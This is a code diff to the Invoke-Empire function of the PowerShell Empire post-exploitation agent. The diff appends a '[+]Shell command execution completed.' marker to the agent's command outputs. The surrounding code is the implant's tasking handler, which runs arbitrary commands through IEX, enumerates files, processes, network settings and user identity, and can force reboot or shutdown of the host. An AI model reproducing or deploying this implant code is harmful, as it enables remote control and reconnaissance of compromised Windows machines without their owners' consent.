@@ -265,16 +265,19 @@ function Invoke-Empire {
             # if we have a straight 'shell' command, skip the aliases
             if ($cmdargs.length -eq '') { $output = 'no shell command supplied' }
             else { $output = IEX "$cmdargs" }
+            $output += "`n`r[+]Shell command execution completed."
         }
         else {
             switch -regex ($cmd) {
                 '(ls|dir)' {
                     if ($cmdargs.length -eq "") {
                         $output = Get-ChildItem -force | select lastwritetime,length,name
+                        $output += "`n`r[+]Shell command execution completed."
                     }
                     else {
                         try{
                             $output = IEX "$cmd $cmdargs -Force -ErrorAction Stop | select lastwritetime,length,name"
+                            $output += "`n`r[+]Shell command execution completed."
                         }
                         catch [System.Management.Automation.ActionPreferenceStopException] {
                             $output = "[!] Error: $_ (or cannot be accessed)."
@@ -297,7 +300,8 @@ function Invoke-Empire {
                     {
                         $cmdargs = $cmdargs.trim("`"").trim("'")
                         cd "$cmdargs"
-                        $output = pwd
+                        $output = pwd;"`n`r[+]Shell command execution completed."
+                        #$output += "`n`r[+]Shell command execution completed."
                     }
                 }
                 '(ipconfig|ifconfig)' {
@@ -314,6 +318,7 @@ function Invoke-Empire {
                         $out | Add-Member Noteproperty 'DNSSuffix' $($_.DNSDomainSuffixSearchOrder -join ",")
                         $out
                     } | fl | Out-String | ForEach-Object {$_ + "`n"}
+                    $output += "`n`r[+]Shell command execution completed."
                 }
                 # this is stupid how complicated it is to get this information...
                 '(ps|tasklist)' {
@@ -343,8 +348,9 @@ function Invoke-Empire {
                         $out | Add-Member Noteproperty 'MemUsage' $mem
                         $out
                     } | Sort-Object -Property PID
+                    $output += "`n`r[+]Shell command execution completed."
                 }
-                getpid { $output = [System.Diagnostics.Process]::GetCurrentProcess() }
+                getpid { $output = [System.Diagnostics.Process]::GetCurrentProcess(); $output += "`n`r[+]Shell command execution completed." }
                 route {
                     if (($cmdargs.length -eq '') -or ($cmdargs.lower() -eq 'print')) {
                         # build a table of adapter interfaces indexes -> IP address for the adapater
@@ -369,18 +375,20 @@ function Invoke-Empire {
                             $out | Add-Member Noteproperty 'Metric' $_.Metric1
                             $out
                         } | ft -autosize | Out-String
+                        $output += "`n`r[+]Shell command execution completed."
                     }
-                    else { $output = route $cmdargs }
+                    else { $output = route $cmdargs;$output += "`n`r[+]Shell command execution completed." }
                 }
-                '(whoami|getuid)' { $output = [Security.Principal.WindowsIdentity]::GetCurrent().Name }
+                '(whoami|getuid)' { $output = [Security.Principal.WindowsIdentity]::GetCurrent().Name;$output += "`n`r[+]Shell command execution completed." }
                 hostname {
                     $output = [System.Net.Dns]::GetHostByName(($env:computerName))
+                    #$output += "`n`r[+]Shell command execution completed."
                 }
                 '(reboot|restart)' { Restart-Computer -force }
                 shutdown { Stop-Computer -force }
                 default {
                     if ($cmdargs.length -eq '') { $output = IEX $cmd }
-                    else { $output = IEX "$cmd $cmdargs" }
+                    else { $output = IEX "$cmd $cmdargs";$output += "`n`r[+]Shell command execution completed." }
                 }
             }
         }
